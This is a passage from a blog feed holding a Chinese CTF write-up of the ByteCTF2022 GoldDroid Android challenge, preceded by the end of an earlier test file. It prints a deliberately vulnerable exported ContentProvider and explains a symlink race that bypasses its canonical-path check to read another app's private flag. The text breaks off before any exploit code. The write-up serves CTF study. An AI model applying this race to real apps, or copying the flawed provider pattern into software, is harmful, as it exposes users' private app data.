*/</span></span><br><span class="line"><span class="meta">@RunWith(AndroidJUnit4.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleInstrumentedTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PM_TEST&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TARGET</span> <span class="operator">=</span> <span class="string">&quot;com.bytectf.golddroid&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testPmVsApi</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> InstrumentationRegistry</span><br><span class="line">                .getInstrumentation()</span><br><span class="line">                .getTargetContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">PackageManager</span> <span class="variable">pm</span> <span class="operator">=</span> ctx.getPackageManager();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =========================</span></span><br><span class="line">        <span class="comment">// 1. PackageManager API</span></span><br><span class="line">        <span class="comment">// =========================</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ApplicationInfo</span> <span class="variable">ai</span> <span class="operator">=</span></span><br><span class="line">                    pm.getApplicationInfo(TARGET, <span class="number">0</span>);</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;[API] sourceDir = &quot;</span> + ai.sourceDir);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;[API] NameNotFoundException&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;[API] Exception: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// =========================</span></span><br><span class="line">        <span class="comment">// 2. pm path (Runtime.exec)</span></span><br><span class="line">        <span class="comment">// =========================</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime()</span><br><span class="line">                    .exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;pm path &quot;</span> + TARGET&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">            String line;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">hasOutput</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                hasOutput = <span class="literal">true</span>;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;[PM] &quot;</span> + line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!hasOutput) &#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;[PM] no output&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">&quot;[PM] Exception: &quot;</span> + e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2022-MITM分析&quot;&gt;&lt;a href=&quot;#ByteCTF2022-MITM分析&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2022 MITM分析&quot;&gt;&lt;/a&gt;ByteCTF2022 MITM分析&lt;/h1&gt;&lt;h2 id=&quot;A</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Bytectf2022 GoldDroid复现</title>
    <link href="http://matriy330.github.io/f9566dab/"/>
    <id>http://matriy330.github.io/f9566dab/</id>
    <published>2026-01-28T13:58:37.000Z</published>
    <updated>2026-01-28T13:58:50.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Bytectf2022-GoldDroid复现"><a href="#Bytectf2022-GoldDroid复现" class="headerlink" title="Bytectf2022 GoldDroid复现"></a>Bytectf2022 GoldDroid复现</h1><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>这里的VulProvider是导出的，谁都可以通过 content:&#x2F;&#x2F;slipme&#x2F;… 来访问这个 Provider</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.golddroid&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;27&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.GoldDroid&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.golddroid.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.golddroid.VulProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;slipme&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.golddroid.FlagReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.startup.InitializationProvider&quot;</span> <span class="attr">andraoid:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.bytectf.golddroid.androidx-startup&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.emoji2.text.EmojiCompatInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="FlagReceiver"><a href="#FlagReceiver" class="headerlink" title="FlagReceiver"></a>FlagReceiver</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.golddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.BroadcastReceiver</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;flag&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flag != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), <span class="string">&quot;flag&quot;</span>);</span><br><span class="line">            writeFile(file, flag);</span><br><span class="line">            Log.e(<span class="string">&quot;FlagReceiver&quot;</span>, <span class="string">&quot;received flag.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:7:0x0016 -&gt; B:23:0x0026). Please submit an issue!!! */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeFile</span><span class="params">(File file, String s)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file, <span class="literal">true</span>);</span><br><span class="line">                    writer.write(s);</span><br><span class="line">                    writer.write(<span class="number">10</span>);</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e2) &#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e3) &#123;</span><br><span class="line">                    e3.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> th;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.golddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">File</span> <span class="variable">externalFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getExternalFilesDir(<span class="string">&quot;sandbox&quot;</span>), <span class="string">&quot;file1&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(externalFile);</span><br><span class="line">            fileOutputStream.write(<span class="string">&quot;I&#x27;m in external\n&quot;</span>.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">externalFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(</span><br><span class="line">    getExternalFilesDir(<span class="string">&quot;sandbox&quot;</span>),</span><br><span class="line">    <span class="string">&quot;file1&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>getExternalFilesDir(“sandbox”) 返回 <strong>App 专属的外部存储目录</strong>，不需要任何存储权限</p><p>真实路径一般是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/storage/emulated/0/Android/data/com.bytectf.golddroid/files/sandbox/</span><br></pre></td></tr></table></figure><p>写入I’m in external</p><h3 id="VulProvider"><a href="#VulProvider" class="headerlink" title="VulProvider"></a>VulProvider</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.golddroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.ContentProvider;</span><br><span class="line"><span class="keyword">import</span> android.content.ContentValues;</span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.ParcelFileDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulProvider</span> <span class="keyword">extends</span> <span class="title class_">ContentProvider</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> ParcelFileDescriptor <span class="title function_">openFile</span><span class="params">(Uri uri, String mode)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">root</span> <span class="operator">=</span> getContext().getExternalFilesDir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(getContext().getExternalFilesDir(<span class="string">&quot;sandbox&quot;</span>), uri.getLastPathSegment());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!file.getCanonicalPath().startsWith(root.getCanonicalPath())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ParcelFileDescriptor.open(file, <span class="number">268435456</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">(Uri uri)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.content.ContentProvider</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ContentProvider是给外部或内部通过 <code>content://</code> URI 访问文件用的组件，是一个总规范，这里是其的一个实现，而FileProvider是其另一个实现</p></blockquote><p>只实现了 <code>openFile()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public ParcelFileDescriptor openFile(Uri uri, String mode)</span><br></pre></td></tr></table></figure><p> 当用 <code>content://slipme/...</code> 访问时系统调用这个方法返回一个 <strong>文件描述符</strong>，让对方读这个文件</p><p>获取应用的外部存储 sandbox 目录，取 URI 最后一段作为文件名，在 sandbox 目录下拼出一个文件路径</p><blockquote><p><strong>ParcelFileDescriptor 是可以跨进程传递的文件句柄</strong>，ContentProvider 可能被别的 App（别的进程）调用普通 <code>File</code> &#x2F; <code>InputStream</code> <strong>不能跨进程传</strong>Android 需要一种 <strong>IPC 安全传文件的方式</strong>，底层是 Linux 的 <strong>file descriptor（fd）</strong>，外面包了一层，可序列化，可通过 Binder 传递</p><p>IPC 是不同进程之间相互通信的机制</p><p>file.getCanonicalPath()获取文件的真实、规范、去歧义路径，消除 <code>.</code> 和 <code>..</code>，解析符号链接（symlink）返回系统认可的<strong>唯一绝对路径</strong></p><p>如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File f = new File(&quot;/sdcard/test/../a.txt&quot;);</span><br><span class="line">f.getCanonicalPath();</span><br></pre></td></tr></table></figure><p>结果是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/a.txt</span><br></pre></td></tr></table></figure><hr><p>再比如（有软链接）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/sdcard/link -&gt; /data/data/app/secret.txt</span><br><span class="line">file.getCanonicalPath();</span><br></pre></td></tr></table></figure><p>返回的是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/data/app/secret.txt</span><br></pre></td></tr></table></figure><p>杜绝目录穿越</p></blockquote><p>root.getCanonicalPath()</p><p>以只读模式打开这个文件，文件句柄返回给调用方</p><blockquote><p>这个 Provider 的功能就是：允许通过 content:&#x2F;&#x2F;slipme&#x2F;文件名，只读方式打开应用 externalFilesDir&#x2F;sandbox 目录下的文件</p></blockquote><p><strong>这里如果使用软链接，则会返回软链接指向的路径，这是本题的关键点。</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据xml和provider可以想到以content:&#x2F;&#x2F;simple&#x2F;..&#x2F;..&#x2F;..&#x2F;xxx这样目录穿越形式访问flag</p><p>getCanonicalPath回去把..和.去掉，需要绕过，此外<strong>getLastPathSegment</strong>，只会保留最后一段，但是<code>canonicalPath + startsWith(root)</code> 会拦住跳出 sandbox 的真实路径</p><blockquote><p>这里突然想到为什么能目录穿越去访问另一个目录的文件?Android不是做了存储分区吗?访问隔离，即一个APP不能随意访问另一个APP的数据，就是之前ByteCTF2021的Bytedroid1 再回顾了下，当时确实没太理解为什么给777，就是为了让一个APP访问另一个APP的evil.HTML</p></blockquote><p>因此可以想到使用软链接的方法进行读取，可以通过在pwngolddroid的数据目录下创建软链接指向&#x2F;data&#x2F;data&#x2F;com.bytectf.golddroid&#x2F;files&#x2F;flag ，然后进行读取，但是软链接同样无法通过校验，因为校验会直接拿到软链接指向的实际路径。但是通过观察发现虽然校验是获取了绝对路径，但是读取还是直接使用file进行读取，所以可以想到不断的切换创建的软链接指向的实际文件，进行条件竞争，直到flag被成功读取。</p><p>因此可以编写pwngolddroid反复链接两个文件，利用条件竞争读取<code>flag</code> 。</p><p>校验阶段希望看到什么？</p><p>校验条件是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">canonicalPath.startsWith(sandboxPath)</span><br></pre></td></tr></table></figure><p>所以在<strong>校验发生的那一刻</strong>：symlink <strong>必须指向</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/storage/emulated/0/Android/data/com.bytectf.golddroid/files/sandbox/file1</span><br></pre></td></tr></table></figure><p>读取阶段希望看到什么？</p><p>读取真正发生在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParcelFileDescriptor.open(file)</span><br></pre></td></tr></table></figure><p>直接用当前文件对象去打开。所以在<strong>读取发生的那一刻</strong>：</p><p>symlink <strong>必须已经被切换成指向</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 